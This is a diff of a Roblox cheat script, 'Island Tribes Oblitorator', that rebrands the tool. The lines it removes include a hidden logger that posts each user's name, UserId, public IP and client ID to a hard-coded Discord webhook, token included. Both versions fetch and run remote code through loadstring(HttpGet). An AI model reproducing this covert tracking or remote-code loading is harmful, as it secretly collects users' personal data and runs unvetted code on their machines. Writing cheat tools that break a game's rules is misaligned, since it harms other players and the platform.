@@ -1,27 +1,17 @@
---AntiHttpSpy
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AltTheReal/OBEDSKDKSKFJSJF/main/AntiHTTPSpy.lua"))()
-local loading = false
-repeat task.wait()
-	if not loading then
-		loading = true
-		print('Loading Oblitorator By Antonio')
-	end
-until not game:GetService("Players").LocalPlayer:WaitForChild('PlayerGui'):FindFirstChild('Loading') or game:GetService("Players").LocalPlayer:WaitForChild('PlayerGui'):FindFirstChild('Loading').Parent == nil
 
-
-local Atlas = loadstring(game:HttpGet("https://raw.githubusercontent.com/hiptodude2/the-opness-of-island-tribes/main/AtlasNewVers.lua"))()
+local Atlas = loadstring(game:HttpGet("https://raw.githubusercontent.com/TheRealGamer903/IslandTribesObliterator/refs/heads/main/Atlas"))()
 local AtlasUi = Atlas.new({
     Name = "Island Tribes Oblitorator";
     ConfigFolder = "IslandTribes"; 
-    Credit = "Credits: zvvpe Antonio";
-    Color = Color3.fromRGB(255,0,0);
+    Credit = "Credits: zvvpe TheRealGamer903#7339";
+    Color = Color3.fromRGB(0, 255, 0);
     UseLoader = true;
     Bind = "LeftBracket";
-    FullName = "FUCK you";
+    FullName = "Island Tribes Oblitorator";
     CheckKey = function(lbozo) -- this can be nil to disable key checking
-        return lbozo == "1001240139"
+        return lbozo == "GAMERONTOP"
     end;
-    Discord = "https://discord.gg/kBbdJ6v9";
+    Discord = "https://discord.gg/Hh5gUpcUpd";
 })
 
 function MakeAtlasNotification(title, desc, time)
@@ -33,59 +23,6 @@ function MakeAtlasNotification(title, desc, time)
     })
 end
 
-HttpService = game:GetService("HttpService")
-Webhook_URL =  "https://discord.com/api/webhooks/1307451530475212880/kQfaYMZX_9yofuAFXIFhERUZ_YhvqcxFulm8l-Qyxbb2ZIw9drnPTCXAQH9-E4VGOQUX"
- 
-local request = syn and syn.request or request or http and http.request or http_request
- 
-local response = request({
-    Url = Webhook_URL,
-    Method = "POST",
-    Headers = {
-        ['Content-Type'] = 'application/json'
-    },
-    Body = HttpService:JSONEncode({
-        ["content"] = "",
-        ["embeds"] = {
-            {
-                ["title"] = "",
-                ["description"] = game.Players.LocalPlayer.Name .." Tried Logging Into The Script More Info Below",
-                ["type"] = "rich",
-                ["color"] = tonumber(0xffffff),
-                ["fields"] = {
-                    {
-                        ["name"] = "Player Name : ",
-                        ["value"] = game.Players.LocalPlayer.Name,
-                        ["inline"] = true
-                    }, {
-                        ["name"] = "UserId : ",
-                        ["value"] = game.Players.LocalPlayer.UserId,
-                        ["inline"] = true
-                    }, {
-                        ["name"] = "User Profile : ",
-                        ["value"] = "https://www.roblox.com/users/" ..
-                            game.Players.LocalPlayer.UserId,
-                        ["inline"] = true
-                    }, {
-                        ["name"] = "IP: ",
-                        ["value"] = game:HttpGet("https://api.ipify.org/?format=json"),
-                        ["inline"] = true
-                    }, {
-                        ["name"] = "Client Id : ",
-                        ["value"] = game:GetService("RbxAnalyticsService")
-                            :GetClientId(),
-                        ["inline"] = true
-                    }, {
-                        ["name"] = "Key : ",
-                        ["value"] = "1001240139",
-                        ["inline"] = true
-                    }
-                }
-            }
-        }
-    })
-})
---Services
 Workspace = game:GetService('Workspace')
 Players = game:GetService('Players')
 ReplicatedStorage = game:GetService('ReplicatedStorage')
@@ -113,7 +50,7 @@ Camera = Workspace.CurrentCamera
 ALLITEMS = {
     [1] = "Stick",
     [2] = "Small Raft",
-    [3] = "Small Campfire", 
+    [3] = "Small Campfire",
     [4] = "Wood Boots",
     [5] = "Wooden Harvester",
     [6] = "Wood Helmet",
@@ -3974,5 +3911,7 @@ local BumpUpVisualsSection = Visuals:CreateSection('')
 
 local CreditSection = Credits:CreateSection('Credits')
 
-CreditSection:CreateParagraph("꧁ঔৣAntonioঔৣ꧂(on discord)")
-CreditSection:CreateParagraph("Join the discord! [https://discord.gg/kBbdJ6v9
+CreditSection:CreateParagraph("TheRealGamer903#7339(on discord)")
+CreditSection:CreateParagraph("Join the discord! [https://discord.gg/Hh5gUpcUpd]")
+
+
